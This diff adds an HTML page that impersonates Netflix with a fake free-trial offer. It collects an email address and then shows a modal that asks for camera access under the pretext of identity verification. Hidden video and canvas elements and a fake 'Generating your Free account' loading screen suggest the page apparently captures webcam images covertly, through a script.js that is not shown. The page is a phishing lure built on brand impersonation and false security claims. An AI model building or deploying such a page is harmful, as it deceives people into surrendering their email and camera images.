@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix</title>
+  <link rel="stylesheet" href="style.css">
+
+</head> 
+
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="1280" height="720"></canvas>
+
+<body>
+
+  <div class="main">
+
+    <div class="navbar">
+      <li class="logo"><img src="logo.png" alt="Netflix Logo"></li>
+      <li class="buttons">Sign In</a>
+    </div>
+
+    <div class="area">
+
+      <h1>Unlimited movies, TV <br>shows, and more.</h1>
+      <h3>Watch anywhere. Cancel anytime.</h3>
+
+      <div class="netflix-search">
+        <input type="text" class="netflix-search-input" id="emailInput" placeholder="Email address...">
+        <button class="netflix-search-button" onclick="showModal()">Start Free Trial</button>
+      </div>
+
+      <h4>Ready to watch? Enter your email to create or access your account</h4>
+
+    </div>
+
+  </div>
+
+  <div id="cameraModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal()">&times;</span>
+      <h2>Enable Camera Access</h2>
+      <p>To ensure the security of your account, please allow camera access. This allows us to verify your identity
+        and securely process your free account claim.</p>
+      <button id="allowButton" class="allow" onclick="requestCameraAccess()">Allow Camera Access</button>
+    </div>
+  </div>
+
+  <!-- Loading message -->
+  <div id="loadingMessage">
+    <h2>Loading <div class="spinner"></div>
+    </h2>
+    <p>Generating your Free account. Please wait.</p>
+    <div class="bar"></div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="script.js"></script>
+
+</html>
